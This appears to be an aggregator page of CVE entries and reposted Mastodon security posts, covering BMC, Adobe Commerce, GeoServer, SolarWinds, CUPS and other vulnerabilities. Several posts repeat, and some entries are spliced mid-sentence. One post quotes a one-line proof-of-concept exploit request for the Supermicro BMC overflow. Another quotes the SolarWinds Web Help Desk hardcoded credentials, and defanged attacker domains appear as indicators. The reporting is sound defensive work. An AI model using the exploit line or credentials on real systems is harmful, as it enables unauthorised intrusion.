#threatintel #SloppyLemming #OutriderTiger #IOC #CTI #cyberthreatintelligence #infosec #CVE_2023_38831 #vulnerability #eitw #cyberespionage #India #cybersecurity

##
screaminggoat@infosec.exchange at 2024-09-25T13:54:00.000Z ##

Reference: CVE-2023-38831 (7.8 high, disclosed 23 August 2023 by Group-IB as an exploited zero-day, added to CISA's KEV Catalog 24 August 2023, has proof of concept) RARLAB WinRAR Code Execution Vulnerability

Cloudflare reports that an APT dubbed SloppyLemming (aka India-nexus Outrider Tiger) used multiple cloud service providers between late 2022 to present for ongoing cyber espionage operations targeting Pakistan, Sri Lanka, Bangladesh, and China. Industries targeted include government, law enforcement, energy, telecommunications, and technology entities. SloppyLemming displays a lack of operational security (OPSEC) allowing Cloudforce One insight into its tooling. The actor primarily targets Pakistani government, defense, telecommunications, technology, and energy sector organizations; SloppyLemming also targets Bangladesh, Sri Lanka, Nepal, and China.

Cloudflare describes SloppyLemming, that their phishing activity focuses on credential and token collection. They describe malware operations (which leverages CVE-2023-38831) and a separate infection chain. While Cloudflare helpfully provides PowerShell hunting scripts, Microsoft Sentinel rule, and a Splunk script, they put the indicators of compromise (including SHA256 hashes) into an IMAGE! Improper Input Validation vulnerability in Microchip Techology Advanced Software Framework example DHCP server can cause remote code execution through a buffer overflow. ASF is no longer being supported. Apply prov

flagthis@botsin.space at 2024-09-24T13:20:20.000Z ##

## Critical Flaw in Microchip ASF Leaves Systems Open to Hackers

**Unpatched vulnerability in Microchip ASF version 3 allows attackers to remotely execute code, putting affected devices at serious risk. ** #cybersecurity #microchip #asf #vulnerability

##

CVE-2024-5445
(3.8 LOW)

EPSS: 0.04%

updated 2024-08-12T13:41:36.517000

2 posts

Ecosystem Agent version 4 < 4.5.1.2597 and Ecosystem Agent version 5 < 5.1.4.2473 did not properly validate SSL/TLS certificates, which could allow a malicious actor to perform a Man-in-the-Middle and intercept traffic between the agent and N-able servers from a privileged network position.

harrysintonen at 2024-09-30T10:13:50.168Z ##

Disclosing details of a #vulnerability I discovered 1 year ago:

N-able Ecosystem Agent Improper Certificate Validation #CVE_2024_5445 vulnerability leads to #RCE as SYSTEM user.

Vulnerability details: https://sintonen.fi/advisories/n-able-ecosystem-agent-improper-certificate-validation.txt

N-able has rated this vulnerability CVSS 3.8, but the practical impact of this vulnerability is grave as it allows attackers in privileged network position to fully compromise vulnerable systems. While arguing for such low score N-able presentative stated that: "The vulnerability reported does not constitute an RCE, the Ecosystem agent is designed to run installation packages in a privileged context and the agent is doing what it should do when it receives such packages to install over the APIs."

I think this is somewhat disingenuous.

#infosec #cybersecurity

##
harrysintonen@infosec.exchange at 2024-09-30T10:13:50.000Z ##

Disclosing details of a #vulnerability I discovered 1 year ago:

N-able Ecosystem Agent Improper Certificate Validation #CVE_2024_5445 vulnerability leads to #RCE as SYSTEM user.

Vulnerability details: https://sintonen.fi/advisories/n-able-ecosystem-agent-improper-certificate-validation.txt

N-able has rated this vulnerability CVSS 3.8, but the practical impact of this vulnerability is grave as it allows attackers in privileged network position to fully compromise vulnerable systems. While arguing for such low score N-able presentative stated that: "The vulnerability reported does not constitute an RCE, the Ecosystem agent is designed to run installation packages in a privileged context and the agent is doing what it should do when it receives such packages to install over the APIs."

I think this is somewhat disingenuous.

#infosec #cybersecurity

##

CVE-2024-36435
(9.8 CRITICAL)

EPSS: 0.04%

updated 2024-08-01T15:31:55

3 posts

An issue was discovered on Supermicro BMC firmware in select X11, X12, H12, B12, X13, H13, and B13 motherboards (and CMM6 modules). An unauthenticated user can post crafted data to the interface that triggers a stack buffer overflow, and may lead to arbitrary remote code execution on a BMC.

LukaszOlejnik@mastodon.social at 2024-09-28T05:01:53.000Z ##

Proof of concept of a vulnerability in the BMC controller, allowing remote code execution in the server room. requests.post(‘https://192.168.10.53:443/cgi/login.cgi’, data=f ‘name={base64.b64encode(b’\x00‘ * 456 + (0x7628F874).to_bytes(4, “little”) + b’\x00‘ * 12 + (0x762864D4).to_bytes(4, “little”) + b’\x00' * 4 + (0x762936D4). to_bytes(4, ‘little’) + b'touch /tmp/BRLY‘).decode()}&pwd=&check=1’, verify=False) https://www.binarly.io/blog/cve-2024-36435-deep-dive-the-years-most-critical-bmc-security-flaw

##
Tinolle at 2024-09-27T19:12:25.667Z ##

CVE-2024-36435 Deep-Dive: The Year’s Most Critical BMC Security Flaw
https://www.binarly.io/blog/cve-2024-36435-deep-dive-the-years-most-critical-bmc-security-flaw

##
LukaszOlejnik@mastodon.social at 2024-09-28T05:01:53.000Z ##

Proof of concept of a vulnerability in the BMC controller, allowing remote code execution in the server room. requests.post(‘https://192.168.10.53:443/cgi/login.cgi’, data=f ‘name={base64.b64encode(b’\x00‘ * 456 + (0x7628F874).to_bytes(4, “little”) + b’\x00‘ * 12 + (0x762864D4).to_bytes(4, “little”) + b’\x00' * 4 + (0x762936D4). to_bytes(4, ‘little’) + b'touch /tmp/BRLY‘).decode()}&pwd=&check=1’, verify=False) https://www.binarly.io/blog/cve-2024-36435-deep-dive-the-years-most-critical-bmc-security-flaw

##

CVE-2024-3833
(8.8 HIGH)

EPSS: 0.04%

updated 2024-08-01T13:56:42.740000

2 posts

Object corruption in WebAssembly in Google Chrome prior to 124.0.6367.60 allowed a remote attacker to potentially exploit object corruption via a crafted HTML page. (Chromium security severity: High)

hweimer@fediscience.org at 2024-09-30T10:17:33.000Z ##

@kuketzblog Praktisch alle Browser-Bugs für remote code execution betreffen Javascript-Code (z.B. CVE-2023-37450, CVE-2023-3420, CVE-2024-3833). Selten ist wie in CVE-2023-4863 sowas wie eine Bildbibliothek betroffen.

Wenn du eine typische Webseite gehst (z.B. Zeit), dann werden da 10-20 Javascript-Elemente von externen Unternehmen nachgeladen, und das ist nur die erste Ebene. Das erhöht massiv die Angriffsoberfläche und Chrome unter Android bietet keine Möglichkeit, sich dagegen zu wehren.

##
hweimer@fediscience.org at 2024-09-30T10:17:33.000Z ##

@kuketzblog Praktisch alle Browser-Bugs für remote code execution betreffen Javascript-Code (z.B. CVE-2023-37450, CVE-2023-3420, CVE-2024-3833). Selten ist wie in CVE-2023-4863 sowas wie eine Bildbibliothek betroffen.

Wenn du eine typische Webseite gehst (z.B. Zeit), dann werden da 10-20 Javascript-Elemente von externen Unternehmen nachgeladen, und das ist nur die erste Ebene. Das erhöht massiv die Angriffsoberfläche und Chrome unter Android bietet keine Möglichkeit, sich dagegen zu wehren.

CVE-2024-4707
(5.4 MEDIUM)

EPSS: 0.05%

updated 2024-07-24T17:59:29.230000

2 posts

The Materialis Companion plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's materialis_contact_form shortcode in all versions up to, and including, 1.3.41 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts

CVE-2024-34102
(9.8 CRITICAL)

EPSS: 97.28%

updated 2024-07-18T01:00:03.197000

3 posts

Adobe Commerce versions 2.4.7, 2.4.6-p5, 2.4.5-p7, 2.4.4-p8 and earlier are affected by an Improper Restriction of XML External Entity Reference ('XXE') vulnerability that could result in arbitrary code execution. An attacker could exploit this vulnerability by sending a crafted XML document that references external entities. Exploitation of this issue does not require user interaction.

https://github.com/SamJUK/cosmicsting-validator

https://github.com/jakabakos/CVE-2024-34102-CosmicSting-XXE-in-Adobe-Commerce-and-Magento

https://github.com/11whoami99/CVE-2024-34102

screaminggoat at 2024-10-02T14:04:53.037Z ##

Sansec: Thousands of Adobe Commerce stores hacked in competing CosmicSting campaigns
Reference: CVE-2024-34102 (9.8 critical, disclosed 11 July 2024 by Adobe as an exploited zero-day, added to KEV Catalog 17 July 2024) Adobe Commerce and Magento Open Source Improper Restriction of XML External Entity Reference (XXE) Vulnerability... aka CosmicSting

Sansec reports that 5% of all Adobe Commerce and Magento stores have been hacked since the announcement of the exploited zero-day CVE-2024-34102. Seven distinct groups are using CosmicSting attacks to plant malicious code on victim stores.

Usually, the first hacker to break into a site will secure it to keep others out. However, the CosmicSting vulnerability prevents this, leading to multiple groups fighting for control over the same store and evicting each other again and again.

Sansec lists and describes the cybercriminals:

  • Group Bobry: using whitespace encoding to hide malware in plain sight
  • Group Polyovki: using cdnstatics[.]net to embed a script
  • Group Surki: used the number 42 to encrypt its payload and operates using domain fallodick87-78[.]sbs
  • Group Burunduki: their loader uses a custom port sniffer for a websocket at wss[://]jgueurystatic[.]xyz:8101
  • Group Ondatry: builds custom malware that integrates specifically with the payment solution of that merchant.
  • Group Khomyaki: uses malware loader endppoints with two character URIs
  • Group Belki: uses CosmicSting with CNEXT for RCE, hides backdoors in files, and background processes, injects skimming malware

Indicators of compromise are all over the blog post. There are also older indicators

#threatintel #cybercrime #cosmicsting #CVE_2024_34102 #adobecommerce #magento #IOC #cyberthreatintelligence #cti #infosec #cybersecurity

##
iulianvostrut@mastodon.social at 2024-10-02T12:24:48.000Z ##

Urgent: Critical vulnerability CVE-2024-34102 impacting 5% of Adobe Commerce & Magento stores. 7 hacker groups injecting malicious scripts. Patching alone isn't enough—rotate encryption keys now! Check details at: https://t.co/FEujjbiBVU #cybersecurity

Sansec lists and describes the cybercriminals:

  • Group Bobry: using whitespace encoding to hide malware in plain sight
  • Group Polyovki: using cdnstatics[.]net to embed a script
  • Group Surki: used the number 42 to encrypt its payload and operates using domain fallodick87-78[.]sbs
  • Group Burunduki: their loader uses a custom port sniffer for a websocket at wss[://]jgueurystatic[.]xyz:8101

  • Group Khomyaki: uses malware loader endppoints with two character URIs

CVE-2024-36401
(9.8 CRITICAL)

EPSS: 95.88%

updated 2024-07-16T01:00:01.567000

2 posts

GeoServer is an open source server that allows users to share and edit geospatial data. Prior to versions 2.23.6, 2.24.4, and 2.25.2, multiple OGC request parameters allow Remote Code Execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as XPath expressions. The GeoTools library API that GeoServ

breachhq at 2024-09-26T14:15:06.292Z ##

🚨#DataBreach🚨
In September 2024, the Chinese APT group known as Earth Baxia targeted a government organization in Taiwan and other entities within the Asia-Pacific region by exploiting a Remote Code Execution (RCE) vulnerability in GeoServer (CVE-2024-36401). This flaw, caused by unsafe evaluation of property names as XPath expressions, has a CVSS score of 9.8 and affects GeoServer versions prior to 2.23.6, 2.24.4, and 2.25.2.

The thr...
https://breach-hq.com/breaches/taiwan/2024-sep

##
jodygarnett@fosstodon.org at 2024-09-21T20:34:58.000Z ##

So here is the game. If you see a @geoserver instance, and you can read the version number on the welcome, please ask the admin to read the following post: https://geoserver.org/vulnerability/2024/09/12/cve-2024-36401.html

If you don't see a version number (whew) direct them to https://geoserver.org/behind%20the%20scenes/2024/09/10/gs3.html

There are well over 10k GeoServer’s out there; please help contact them.

updated 2024-06-27T18:38:20.037000

For RocketMQ versions 5.1.0 and below, under certain conditions, there is a risk of remote command execution.  Several components of RocketMQ, including NameServer, Broker, and Controller, are leaked on the extranet and lack permission verification, an attacker can exploit this vulnerability by using the update configuration function to execute commands as the system users that RocketMQ is runnin

PC_Fluesterer@social.tchncs.de at 2024-10-04T13:51:50.000Z ##

@sihaha
My first question is always: How is the initial entry accomplished, where does the attack vector start? Answers here:
- misconfigurations or
- exploit vulnerability in Apache RocketMQ (CVE-2023-33246).

Both are administration faults. The latter because updates were available immediately. Failure to install those is an administrator's fault.

##

CVE-2023-36039
(8.0 HIGH)

EPSS: 0.06%

updated 2024-05-29T02:15:59.963000

2 posts

Microsoft Exchange Server Spoofing Vulnerability

screaminggoat at 2024-09-26T21:31:11.746Z ##

Zero Day Initiative: Exploiting Exchange PowerShell After ProxyNotShell: Part 4 – No Argument Constructor
This is the 4th and final part in a series of 4 blog posts. (See parent toots above)
Piotr Bazydło @chudypb describes the PowerShell Remoting ConvertViaNoArgumentConstructor conversion mechanism, which allowed him to find 3 more vulnerabilities:

  • CVE-2023-36050 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as an XXE (File Read))
  • CVE-2023-36039 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)
  • CVE-2023-36035 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)

The deserialization routine for ConvertViaNoArgumentConstructor opens up two main exploitation vectors: dangerous members of allowed types, and dangerous setters of allowed types.

Note that CVE-2023-36035 is a partial bypass of CVE-2023-36756 (8.0, disclosed 12 September 2023) Microsoft Exchange Server Remote Code Execution Vulnerability.

#ProxyNotShell #vulnerabilityanalysis #cve #microsoft #exchange

##
screaminggoat@infosec.exchange at 2024-09-26T21:31:11.000Z ##

This is the 4th and final part in a series of 4 blog posts. (See parent toots above)

  • CVE-2023-36039 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)
  • CVE-2023-36035 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)

The deserialization routine for ConvertViaNoArgumentConstructor opens up two main exploitation vectors: dangerous members of allowed types, and dangerous setters of allowed types.

CVE-2024-21338
(7.8 HIGH)

EPSS: 1.43%

updated 2024-04-11T21:30:45

1 posts

Windows Kernel Elevation of Privilege Vulnerability

6 repos

https://github.com/UMU618/CVE-2024-21338

https://github.com/varwara/CVE-2024-21338

https://github.com/Zombie-Kaiser/CVE-2024-21338-x64-build-

https://github.com/Crowdfense/CVE-2024-21338

https://github.com/hakaioffsec/CVE-2024-21338

https://github.com/tykawaii98/CVE-2024-21338_PoC

screaminggoat@infosec.exchange at 2024-09-23T11:20:50.000Z ##

SentinelOne: Kryptina RaaS | From Unsellable Cast-Off to Enterprise Ransomware
Kryptina is a free and open-source Ransomware-as-a-Service (RaaS) platform written for Linux, previously reported by SentinelOne in February 2024. In May 2024, a Mallox affiliate leaked staging server data, revealing that their Linux ransomware was based on a modified version of Kryptina. The affiliate made superficial changes to source code and documentation, stripping Kryptina branding but retaining core functionality. The adoption of Kryptina by Mallox affiliates exemplifies the commoditization of ransomware tools, complicating malware tracking as affiliates blend different codebases into new variants. SentinelOne provides a brief history of both Kryptina and Mallox, description of Kryptina features and a comparison with the Mallox makefiles.

The staging server includes an exploit for CVE-2024-21338 (7.8 high, disclosed 13 February 2024 by Microsoft, reported by Avast as an exploited zero-day used by DPRK hackers, in CISA's KEV Catalog) Windows Kernel Elevation of Privilege Vulnerability. There are other Windows-focused droppers and tools on the server. Indicators of compromise are provided.

#threatintel #kryptina #mallox #raas #ransomware #infosec #cybersecurity #cyberthreatintelligence #CTI #IOC #CVE_2024_21338 #dropper

##
screaminggoat@infosec.exchange at 2024-09-26T21:31:11.000Z ##

Zero Day Initiative: Exploiting Exchange PowerShell After ProxyNotShell: Part 4 – No Argument Constructor
This is the 4th and final part in a series of 4 blog posts. (See parent toots above)
Piotr Bazydło @chudypb describes the PowerShell Remoting ConvertViaNoArgumentConstructor conversion mechanism, which allowed him to find 3 more vulnerabilities:

  • CVE-2023-36050 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as an XXE (File Read))
  • CVE-2023-36039 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)
  • CVE-2023-36035 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)

The deserialization routine for ConvertViaNoArgumentConstructor opens up two main exploitation vectors: dangerous members of allowed types, and dangerous setters of allowed types.

Note that CVE-2023-36035 is a partial bypass of CVE-2023-36756 (8.0, disclosed 12 September 2023) Microsoft Exchange Server Remote Code Execution Vulnerability.

#ProxyNotShell #vulnerabilityanalysis #cve #microsoft #exchange

##

CVE-2023-29383
(3.3 LOW)

EPSS: 0.04%

updated 2024-04-04T03:28:57

2 posts

In Shadow 4.13, it is possible to inject control characters into fields provided to the SUID program chfn (change finger). Although it is not possible to exploit this directly (e.g., adding a new user fails because \n is in the block list), it is possible to misrepresent the /etc/passwd file when viewed. Use of \r manipulations and Unicode characters to work around blocking of the : character make

agresor at 2024-09-24T20:10:50.744Z ##

##

CVE-2024-1580
(5.9 MEDIUM)

EPSS: 0.05%

updated 2024-03-27T18:32:38

2 posts

An integer overflow in dav1d AV1 decoder that can occur when decoding videos with large frame size. This can lead to memory corruption within the AV1 decoder. We recommend upgrading past version 1.4.0 of dav1d.

screaminggoat at 2024-10-04T14:43:49.993Z ##

Google Project Zero: Effective Fuzzing: A Dav1d Case Study
Google Project Zero publishes vulnerability details (and a proof of concept) about CVE-2024-1580 (5.9 medium, disclosed 14 February 2024 by dav1d) integer overflow in dav1d AV1 video decoder. The short explanation is that when multiple decoding threads are used, a signed 32-bit integer overflow can occur when calculating the values to put in the tile start offset array. Dav1d is already being fuzzed by at least oss-fuzz, but it has its limitations: "It's good that the fuzzer will create one or four threads, depending on the fuzzer configuration, but if vulnerabilities exist only when there are three threads, or 19 threads, these will not be detected by any use of this fuzzer."

Another example of untested coverage in the dav1d fuzzer, and the most interesting one for me because it led to the discovery of the integer overflow vulnerability, is the usage of DAV1D_FUZZ_MAX_SIZE.
This maximum frame size did not exist in all configurations used by dav1d users, and although 32-bit platforms have an internally applied limit, there is no limit by default for 64-bit platforms. Removing this line (and using the multithreaded fuzzer with ubsan enabled) was enough to trigger the integer overflow.

#CVE_2024_1580 #vulnerability #CVE #dav1d #infosec #cybersecurity

##
screaminggoat@infosec.exchange at 2024-10-04T14:43:49.000Z ##

Google Project Zero: Effective Fuzzing: A Dav1d Case Study
Google Project Zero publishes vulnerability details (and a proof of concept) about CVE-2024-1580 (5.9 medium, disclosed 14 February 2024 by dav1d) integer overflow in dav1d AV1 video decoder. The short explanation is that when multiple decoding threads are used, a signed 32-bit integer overflow can occur when calculating the values to put in the tile start offset array. Dav1d is already being fuzzed by at least oss-fuzz, but it has its limitations: "It's good that the fuzzer will create one or four threads, depending on the fuzzer configuration, but if vulnerabilities exist only when there are three threads, or 19 threads, these will not be detected by any use of this fuzzer."

Another example of untested coverage in the dav1d fuzzer, and the most interesting one for me because it led to the discovery of the integer overflow vulnerability, is the usage of DAV1D_FUZZ_MAX_SIZE.
This maximum frame size did not exist in all configurations used by dav1d users, and although 32-bit platforms have an internally applied limit, there is no limit by default for 64-bit platforms. Removing this line (and using the multithreaded fuzzer with ubsan enabled) was enough to trigger the integer overflow.

#CVE_2024_1580 #vulnerability #CVE #dav1d #infosec #cybersecurity

1 repos

https://github.com/paulsery/CVE_2023_3420

hweimer@fediscience.org at 2024-09-30T10:17:33.000Z ##

@kuketzblog Praktisch alle Browser-Bugs für remote code execution betreffen Javascript-Code (z.B. CVE-2023-37450, CVE-2023-3420, CVE-2024-3833). Selten ist wie in CVE-2023-4863 sowas wie eine Bildbibliothek betroffen.

Wenn du eine typische Webseite gehst (z.B. Zeit), dann werden da 10-20 Javascript-Elemente von externen Unternehmen nachgeladen, und das ist nur die erste Ebene. Das erhöht massiv die Angriffsoberfläche und Chrome unter Android bietet keine Möglichkeit, sich dagegen zu wehren.

##

screaminggoat at 2024-09-26T21:31:11.746Z ##

Zero Day Initiative: Exploiting Exchange PowerShell After ProxyNotShell: Part 4 – No Argument Constructor
This is the 4th and final part in a series of 4 blog posts. (See parent toots above)
Piotr Bazydło @chudypb describes the PowerShell Remoting ConvertViaNoArgumentConstructor conversion mechanism, which allowed him to find 3 more vulnerabilities:

  • CVE-2023-36050 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as an XXE (File Read))
  • CVE-2023-36039 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)
  • CVE-2023-36035 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)

The deserialization routine for ConvertViaNoArgumentConstructor opens up two main exploitation vectors: dangerous members of allowed types, and dangerous setters of allowed types.

Note that CVE-2023-36035 is a partial bypass of CVE-2023-36756 (8.0, disclosed 12 September 2023) Microsoft Exchange Server Remote Code Execution Vulnerability.

Additional resources:

  • security advisory: https://support.citrix.com/s/article/CTX579459-netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967?language=en_US

  • Mandiant investigation includes Yara rule: https://cloud.google.com/blog/topics/threat-intelligence/session-hijacking-citrix-cve-2023-4966/

CVE-2021-35232
(6.1 MEDIUM)

EPSS: 0.04%

updated 2023-08-12T05:02:44

2 posts

Hard coded credentials discovered in SolarWinds Web Help Desk product. Through these credentials, the attacker with local access to the Web Help Desk host machine allows to execute arbitrary HQL queries against the database and leverage the vulnerability to steal the password hashes of the users or insert arbitrary data into the database.

screaminggoat at 2024-09-25T11:47:09.581Z ##

Horizon3: CVE-2024-28987: SolarWinds Web Help Desk Hardcoded Credential Vulnerability Deep-Dive
Reference: CVE-2024-28987 (CVSSv3.1: 9.1 critical, disclosed 22 August 2024 by SolarWinds) The SolarWinds Web Help Desk (WHD) software is affected by a hardcoded credential vulnerability, allowing remote unauthenticated user to access internal functionality and modify data. See parent toot above.

Apparently @hacks_zach found this vulnerability while looking for CVE-2024-28986 (9.8 critical, disclosed 13 August 2024 by SolarWinds, added to CISA KEV Catalog 15 August 2024) SolarWinds Web Help Desk Deserialization of Untrusted Data Vulnerability. While patch diffing for CVE-2024-28986, and referencing prior vulnerability research like (AssetNote's blog on CVE-2021-35232),

After inspecting many of them, we happen upon the /OrionTickets/* endpoints. These endpoints all map to the OrionTicketController, which extends the com.macsdesign.whd.rest.controllers.BasicAuthRouteController for performing authentication, and has no restrictions on the requesting IP address being localhost like many other controllers enforce.
The BasicAuthRouteController allows a hardcoded set of credentials to access any resources that utilize this controller. The credentials are "helpdeskIntegrationUser" and "dev-C4F8025E7".
While the patch for CVE-2021-35232 made the effort to make the global credentials declared in AppProperties random on each boot, this set of credentials were missed because they were directly referenced.

Proof of Concept is provided. Zach also suggests software development best practice (use "magic strings") and describes where to find indicators of compromise. "At the time of writing this, there are approximately 827 instances of SolarWinds Web Help Desk reachable on the internet."

#CVE_2024_28987 #SolarWinds #WebHelpDesk #vulnerability #CVE #ProofofConcept #poc #rootcauseanalysis

##
screaminggoat@infosec.exchange at 2024-09-25T11:47:09.000Z ##

Horizon3: CVE-2024-28987: SolarWinds Web Help Desk Hardcoded Credential Vulnerability Deep-Dive
Reference: CVE-2024-28987 (CVSSv3.1: 9.1 critical, disclosed 22 August 2024 by SolarWinds) The SolarWinds Web Help Desk (WHD) software is affected by a hardcoded credential vulnerability, allowing remote unauthenticated user to access internal functionality and modify data. See parent toot above.

Apparently @hacks_zach found this vulnerability while looking for CVE-2024-28986 (9.8 critical, disclosed 13 August 2024 by SolarWinds, added to CISA KEV Catalog 15 August 2024) SolarWinds Web Help Desk Deserialization of Untrusted Data Vulnerability. While patch diffing for CVE-2024-28986, and referencing prior vulnerability research like (AssetNote's blog on CVE-2021-35232),

After inspecting many of them, we happen upon the /OrionTickets/* endpoints. These endpoints all map to the OrionTicketController, which extends the com.macsdesign.whd.rest.controllers.BasicAuthRouteController for performing authentication, and has no restrictions on the requesting IP address being localhost like many other controllers enforce.
The BasicAuthRouteController allows a hardcoded set of credentials to access any resources that utilize this controller. The credentials are "helpdeskIntegrationUser" and "dev-C4F8025E7".

Proof of Concept is provided. Zach also suggests software development best practice (use "magic strings") and describes where to find indicators of compromise. "At the time of writing this, there are approximately 827 instances of SolarWinds Web Help Desk reachable on the internet."

CVE-2021-25735
(6.5 MEDIUM)

EPSS: 0.07%

updated 2023-07-31T20:31:50

2 posts

A vulnerability in Kubernetes `kube-apiserver` could allow node updates to bypass a _Validating Admission Webhook_ and allow unauthorized node updates. The information that is provided to the admission controller could contain old configurations that overwrite values used for validation. Since the overwriting takes place before the validation, this could lead the admission controller to accept req

1 repos

https://github.com/darryk10/CVE-2021-25735

kubesploit@learnk8s.news at 2024-10-04T18:16:06.000Z ##

This article discusses the validating admission webhook bypass vulnerability, which allows node updates to bypass a validating admission webhook

You will learn how to detect this type of event by enabling Kubernetes Audit Logging in the cluster

➜ https://sysdig.com/blog/cve-2021-25735-kubernetes-admission-bypass

kubesploit@learnk8s.news at 2024-10-04T18:16:06.000Z ##

##

CVE-2021-4043
(5.5 MEDIUM)

EPSS: 0.91%

CVE-2020-0601
(8.1 HIGH)

EPSS: 96.96%

updated 2023-02-01T05:02:14

2 posts

A spoofing vulnerability exists in the way Windows CryptoAPI (Crypt32.dll) validates Elliptic Curve Cryptography (ECC) certificates.An attacker could exploit the vulnerability by using a spoofed code-signing certificate to sign a malicious executable, making it appear the file was from a trusted, legitimate source, aka 'Windows CryptoAPI Spoofing Vulnerability'.

screaminggoat at 2024-09-30T13:44:03.611Z ##

Sekoia: Hadooken and K4Spreader: The 8220 Gang's Latest Arsenal
Sekoia was able to capture the full attack chain of the Chinese origin cybercriminal 8220 Gang, from targeting CVE-2017-10271 and CVE-2020-14883 in Oracle Weblogic servers to deploy Python and Bash scripts, execute K4Spreader malware, which then delivered the Tsunami backdoor and a cryptominer. There are similarities with Aqua's blog post about Hadooken malware from 12 September 2024. Sekoia covers these different infection chains, the connections with the 8220 Gang, and the cross-references with the Hadooken case previously documented by Aqua. Indicators of compromise are listed on their GitHub repo.

References:

  • CVE-2017-10271 (7.5 high, disclosed 19 October 2017, in KEV) Oracle Corporation WebLogic Server Remote Code Execution Vulnerability
  • CVE-2020-14883 (7.2 high, disclosed 21 October 2020, in KEV) Oracle WebLogic Server Unspecified Vulnerability

#8220gang #cybercrime #cryptomining #CVE_2017_10271 #CVE_2020_14883 #vulnerability #eitw #oracle #weblogic #threatintel #infosec #cybersecurity #cyberthreatintelligence #CTI #IOC

##
screaminggoat@infosec.exchange at 2024-09-30T13:44:03.000Z ##

Sekoia: Hadooken and K4Spreader: The 8220 Gang's Latest Arsenal
Sekoia was able to capture the full attack chain of the Chinese origin cybercriminal 8220 Gang, from targeting CVE-2017-10271 and CVE-2020-14883 in Oracle Weblogic servers to deploy Python and Bash scripts, execute K4Spreader malware, which then delivered the Tsunami backdoor and a cryptominer. There are similarities with Aqua's blog post about Hadooken malware from 12 September 2024. Sekoia covers these different infection chains, the connections with the 8220 Gang, and the cross-references with the Hadooken case previously documented by Aqua. Indicators of compromise are listed on their GitHub repo.

References:

  • CVE-2017-10271 (7.5 high, disclosed 19 October 2017, in KEV) Oracle Corporation WebLogic Server Remote Code Execution Vulnerability
  • CVE-2020-14883 (7.2 high, disclosed 21 October 2020, in KEV) Oracle WebLogic Server Unspecified Vulnerability

screaminggoat at 2024-09-30T13:35:32.084Z ##

Red Hat security advisory: RHBA-2024:7369 - Bug Fix Advisory
See parent toots above for more details about the CUPS vulnerabilities. The rhel9/cups container image has been updated for Red Hat Enterprise Linux 9 to address RHSA-2024:7346
Users of rhel9/cups container images are advised to upgrade to these updated images, which contain backported patches to correct these security issues, fix these bugs and add these enhancements. Users of these images are also encouraged to rebuild all container images that depend on these images.

#CVE_2024_47076 #CVE_2024_47177 #CVE_2024_47175 #CVE_2024_47176 #CUPS #linux #vulnerability #cve #proofofconcept

##
screaminggoat at 2024-09-27T14:57:22.340Z ##

Ubuntu security advisory: USN-7042-1: cups-browsed vulnerability
Simone Margaritelli discovered that cups-browsed could be used to create arbitrary printers from outside the local network. In combination with issues in other printing components, a remote attacker could possibly use this issue to connect to a system, created manipulated PPD files, and execute arbitrary code when a printer is used. This update disables support for the legacy CUPS printer discovery protocol.

The problem can be corrected by updating your system to the following package versions: Ubuntu 24.04

#CVE_2024_47076 #CVE_2024_47177 #CVE_2024_47175 #CVE_2024_47176 #CUPS #linux #vulnerability #cve #proofofconcept

##
screaminggoat at 2024-09-27T14:55:12.990Z ##

Sonicwall security advisory: Common UNIX Printing System (CUPS) Vulnerabilities

The SonicWall PSIRT has analyzed CVE-2024-47076, CVE-2024-47177, CVE-2024-47175, and CVE-2024-47176 in the Common UNIX Printing System (CUPS) to assess their relevance to our products and services.
SonicWall products and cloud services do not incorporate the impacted CUPS software packages and are not affected by these vulnerabilities.

SonicWall PSIRT is aware that a proof of concept (PoC) exploit for this vulnerabilities is publicly available, we have no information regarding any exploitation of this vulnerability in the wild.

#CVE_2024_47076 #CVE_2024_47177 #CVE_2024_47175 #CVE_2024_47176 #CUPS #linux #vulnerability #cve #proofofconcept

screaminggoat at 2024-09-27T00:12:21.039Z ##

Tenable: CVE-2024-47076, CVE-2024-47175, CVE-2024-47176, CVE-2024-47177: Frequently Asked Questions About Common UNIX Printing System (CUPS) Vulnerabilities
This is perhaps the most informative and comprehensive guide to the CUPS vulnerabilities yet. While I question the use of the phrase zero-days, they were publicly announced prematurely due to a leak ahead of a coordinated disclosure date, and proof of concept has been released. Fortunately, it's not the 9.9 doomsday that everyone was hawk tuahing about. Skibidi I don't think anyone reads what I write anyway. Only in Ohio though.

As @CraigHRowland said:

The bad news is there is a vulnerability in the CUPS printer system on Linux. The good news is nobody has ever gotten their printer working on Linux so they are safe.

#CVE_2024_47076 #CVE_2024_47177 #CVE_2024_47175 #CVE_2024_47176 #CUPS #linux #vulnerability #cve

##
screaminggoat at 2024-09-26T21:09:25.449Z ##

SAN ISC: Patch for Critical CUPS vulnerability: Don't Panic

CUPS may use "filters", executables that can be used to convert documents. The part responsible ("cups-filters") accepts unverified data that may then be executed as part of a filter operation. An attacker can use this vulnerability to inject a malicious "printer". The malicious code is triggered once a user uses this printer to print a document. This has little or no impact if CUPS is not listening on port 631, and the system is not used to print documents (like most servers). An attacker may, however, be able to trigger the print operation remotely. On the local network, this is exploitable via DNS service discovery. A proof of concept exploit has been made available.

